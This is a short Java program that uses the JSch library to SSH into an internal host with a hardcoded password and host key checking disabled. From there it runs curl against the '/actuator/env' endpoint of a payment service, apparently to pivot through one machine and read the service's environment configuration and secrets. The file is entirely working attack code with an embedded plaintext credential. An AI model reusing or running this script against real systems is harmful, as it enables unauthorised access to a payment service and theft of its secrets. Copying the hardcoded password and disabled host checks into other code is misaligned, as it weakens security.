import com.jcraft.jsch.*;
import java.io.*;
class SSZ2 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("curl -sk --max-time 10 --resolve payment.accurate.id:443:10.14.16.50 https://payment.accurate.id/actuator/env 2>&1 | head -50");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
